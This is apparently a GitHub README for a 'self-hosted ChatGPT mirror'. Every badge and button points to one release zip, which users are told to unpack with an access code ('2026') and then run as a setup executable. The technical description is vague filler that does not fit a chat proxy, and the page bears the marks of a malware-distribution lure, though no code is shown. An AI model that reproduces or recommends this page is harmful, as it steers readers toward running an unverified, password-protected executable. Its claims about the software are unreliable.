<div align="center">

# ChatgptMirrorSelfhosted — Self-Hosted ChatGPT Mirror for Teams (Portable x64 Build, JSON Configuration)

<p><strong>ChatgptMirrorSelfhosted — Self-Hosted ChatGPT Mirror for Teams (Portable x64 Build, JSON Configuration): Self-hosted ChatGPT mirror for your team — no logins, no limits. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/chatgpt-mirror-selfhosted-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/chatgpt-mirror-selfhosted-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/chatgpt-mirror-selfhosted-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/RufimiJi53/chatgpt-mirror-selfhosted?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/chatgpt-mirror-selfhosted-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download chatgpt-mirror-selfhosted-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/chatgpt-mirror-selfhosted-v0.1.0-win64.zip"><img src="banner.svg" alt="ChatgptMirrorSelfhosted Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**ChatgptMirrorSelfhosted — Self-hosted ChatGPT mirror for your team — no logins, no limits** (`chatgpt-mirror-selfhosted`) is a dedicated, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`chatgpt-mirror-selfhosted-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/chatgpt-mirror-selfhosted-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`chatgpt-mirror-selfhosted-v0.1.0-win64.zip`](../../releases/download/v0.1.0/chatgpt-mirror-selfhosted-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `ChatgptMirrorSelfhosted_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Configuration (`config/settings.json`)

```json
{
  "module": "chatgpt-mirror-selfhosted",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "server": {
      "enabled": true
    },
    "auth": {
      "enabled": true
    },
    "quota": {
      "enabled": true
    },
    "relay": {
      "enabled": true
    },
    "admin": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Usage Guide — commands and options](docs/USAGE.md)

## FAQ

<details>
<summary><b>Does it need OpenAI keys?</b></summary>

It pools the keys you give it — the admin sets them once in the panel.
</details>
<details>
<summary><b>How many users can it hold?</b></summary>

A 2-core box handles a class or small team comfortably.
</details>
<details>
<summary><b>Is there auth?</b></summary>

Optional shared-secret or per-user tokens — your call.
</details>

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## Building from Source

```bash
git clone https://github.com/RufimiJi53/chatgpt-mirror-selfhosted.git
cd chatgpt-mirror-selfhosted
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: chatgpt-mirror-selfhosted, chatgpt, mirror, self-hosted, proxy, team, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
